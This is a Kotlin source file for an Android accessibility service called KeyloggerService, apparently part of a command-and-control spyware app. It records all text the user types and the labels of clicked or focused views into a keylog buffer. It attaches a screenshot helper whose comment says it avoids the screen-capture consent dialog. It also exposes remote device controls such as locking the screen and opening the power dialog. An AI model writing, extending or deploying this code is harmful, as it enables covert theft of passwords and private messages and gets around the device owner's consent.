package com.outcome.c2

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.os.Build
import android.view.accessibility.AccessibilityEvent

class KeyloggerService : AccessibilityService() {

    companion object {
        @Volatile
        var instance: KeyloggerService? = null
            private set
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        // Lets the agent take screenshots without a MediaProjection consent
        // dialog, on Android 11+.
        AccessibilityScreenshot.attach(this)
        try {
            val info = serviceInfo
            info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK
            info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            info.flags = info.flags or AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
            info.notificationTimeout = 100
            serviceInfo = info
        } catch (_: Exception) {}
        LogBus.append(applicationContext, "ACC", "service connected")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        if (!KeylogBuffer.isActive()) return

        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                event.text.forEach { KeylogBuffer.append(it.toString()) }
            }
            AccessibilityEvent.TYPE_VIEW_CLICKED,
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                event.contentDescription?.let { KeylogBuffer.append("[${it}]") }
            }
        }
    }

    override fun onInterrupt() {}

    override fun onDestroy() {
        // onDestroy does not always follow onUnbind, so clearing only in
        // onUnbind left a stale AccessibilityService reference behind and every
        // later capture failed against a dead instance.
        instance = null
        AccessibilityScreenshot.attach(null)
        super.onDestroy()
    }

    override fun onUnbind(intent: android.content.Intent?): Boolean {
        instance = null
        AccessibilityScreenshot.attach(null)
        return super.onUnbind(intent)
    }

    fun lockScreen(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN)
        } else false
    }

    fun goHome(): Boolean = performGlobalAction(GLOBAL_ACTION_HOME)
    fun back(): Boolean = performGlobalAction(GLOBAL_ACTION_BACK)
    fun recents(): Boolean = performGlobalAction(GLOBAL_ACTION_RECENTS)
    fun notifications(): Boolean = performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS)
    fun quickSettings(): Boolean = performGlobalAction(GLOBAL_ACTION_QUICK_SETTINGS)
    fun powerDialog(): Boolean = performGlobalAction(GLOBAL_ACTION_POWER_DIALOG)
}
